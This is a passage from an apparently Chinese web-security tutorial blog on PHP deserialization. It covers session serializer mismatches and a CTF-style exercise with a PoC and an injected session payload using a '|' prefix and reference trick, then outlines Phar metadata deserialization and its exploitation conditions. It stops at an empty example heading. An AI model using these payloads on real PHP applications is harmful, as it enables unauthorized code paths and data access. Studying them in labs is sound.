<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:6:&quot;benben&quot;;s:8:&quot;dazhuang&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="session-php-binary格式"><a href="#session-php-binary格式" class="headerlink" title="session-php_binary格式"></a>session-php_binary格式</h2><ul>
<li>需声明session存储格式为<code>php_binary</code></li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;benben&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;ben&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;b&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>浏览器输入</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ben=dazhuang&amp;b=666</span><br></pre></td></tr></table></figure></div>

<ul>
<li>得到</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ACKbenbens:8:&quot;dahzhuang&quot;;SOHbs:3:&quot;666&quot;</span><br></pre></td></tr></table></figure></div>

<h2 id="Session反序列化例题"><a href="#Session反序列化例题" class="headerlink" title="Session反序列化例题"></a>Session反序列化例题</h2><ul>
<li>分析源代码</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*hint.php*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;her=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name===<span class="variable language_">$this</span>-&gt;her)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>目标：<code>name</code>&#x3D;<code>her</code></li>
<li>由于<code>$this-&gt;her=md5(rand(1, 10000))</code>，使用引用**&amp;**确保相等</li>
<li>poc如下：</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*hint.php*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line"><span class="comment">//    function __wakeup()&#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;her=md5(rand(1, 10000));</span></span><br><span class="line"><span class="comment">//        if ($this-&gt;name===$this-&gt;her)&#123;</span></span><br><span class="line"><span class="comment">//            include(&#x27;flag.php&#x27;);</span></span><br><span class="line"><span class="comment">//            echo $flag;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$flag</span>-&gt;name = &amp;<span class="variable">$flag</span>-&gt;her;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">payload：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;her&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>访问<code>hint.php</code>，分析源代码</li>
<li>以<code>php_serialize</code>格式存储<code>session</code>的值</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>由于是以<code>php</code>格式读<code>seesion</code>值，所以在提交<code>payload</code>时添加竖线<code>|</code>，构造完整<code>payload</code></li>
<li>在浏览器提交：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>存储进去的session值为</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:1:&quot;a&quot;;s:43:&quot;|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x12-Phar反序列化"><a href="#0x12-Phar反序列化" class="headerlink" title="0x12 Phar反序列化"></a>0x12 Phar反序列化</h1><ul>
<li>可以认为<code>Phar</code>是<code>PHP</code>的压缩文档，是<code>PHP</code>中类似于JAR的一种打包文件。它可以把多个文件存放至同一个文件中，无需解压，<code>PHP</code>就可以进行访问并执行内部语句。</li>
<li>默认开启版本 <code>PHP</code>&gt;&#x3D;5.3</li>
<li>文件包含：<code>phar</code>伪协议，可读取 <code>.phar</code>文件。</li>
</ul>
<h2 id="Phar结构"><a href="#Phar结构" class="headerlink" title="Phar结构"></a>Phar结构</h2><ul>
<li>stub</li>
</ul>
<p><code>phar</code>文件标识，格式为<code>xxx&lt;?php xxx;__HALT_COMPiLER();?&gt;;</code>。**(头部信息)**</p>
<ul>
<li>manifest</li>
</ul>
<p>压缩文件的属性等信息，以<strong>序列化</strong>存储。</p>
<ul>
<li>contents</li>
</ul>
<p>压缩文件的内容。</p>
<ul>
<li>signature</li>
</ul>
<p>签名，放在文件末尾。</p>
<p><strong>注：</strong><code>Phar</code>协议解析文件时，会自动触发对<code>manifest</code>字段的<strong>序列化</strong>字符串进行<strong>反序列化</strong></p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><code>Phar</code>之所以能反序列化，是因为<code>Phar</code>文件会以序列化的形式存储用户自定义的<code>meta-data</code>,<code>PHP</code>使用<code>phar_parse_metadata</code>在解析meta数据时，会调用<code>php_var_unserialize</code>进行反序列化操作。</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li><p><code>phar</code>文件能上传到服务器。</p>
</li>
<li><p>要有可用反序列化魔术方法作为跳板。</p>
</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">destruck()</span><br><span class="line">weakup()</span><br></pre></td></tr></table></figure></div>

<ul>
<li>要有文件操作函数</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_exists()、fopen()、file_get_contents()等</span><br></pre></td></tr></table></figure></div>

<ul>
<li>文件操作函数参数可控，且<code>、</code> <code>/、</code> <code>phar</code>等特殊字符没有被过滤。</li>
</ul>
<h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2>]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
</search>
